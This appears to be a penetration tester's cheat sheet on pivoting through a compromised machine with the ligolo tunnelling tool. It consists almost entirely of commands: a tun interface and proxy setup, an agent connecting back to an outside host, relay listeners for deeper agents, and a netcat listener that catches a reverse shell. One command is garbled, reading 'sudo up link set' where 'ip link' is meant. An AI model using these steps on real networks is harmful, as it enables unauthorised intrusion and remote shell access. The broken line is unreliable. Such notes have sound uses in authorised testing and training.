# Pivoting

## Setting up proxy

Create a tuntap interface
```bash
sudo ip tuntap add user kali mode tun ligolo
sudo up link set ligolo up
```

Start ligolo proxy
```bash
ligolo-proxy -selfcert
```

## Connecting Agent and adding route

Connect to tunnel
```bash
./agent -connect host:11601 -ignore-cert
```

Configure new interface in ligolo-proxy
```bash
session
(select session by number)
ifconfig (get interface info)
```

Add route on ligolo-proxy host
```bash
sudo ip route add (interface) dev ligolo

[in ligolo-proxy] 
start
```

## Creating a deeper reverse-shell

Creating route through agent
```bash
[in ligolo-proxy]
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
# pivot will now redirect to deeper agents
```

Reverse shell complete
```bash
nc -lvnp 1000
[connect to the internal interface of pivot machine]
```